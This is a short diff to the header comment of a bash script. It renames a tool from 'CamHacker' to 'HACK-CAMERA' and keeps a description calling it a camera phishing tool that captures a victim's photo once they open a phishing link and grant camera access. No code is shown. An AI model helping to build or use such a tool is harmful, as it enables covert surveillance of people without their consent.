@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# CamHacker
+# HACK-CAMERA 
 # Version    : 1.5
 # Description: HACK-CAMERA is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
 # Author     : XPHANTOM (PH4N70M)
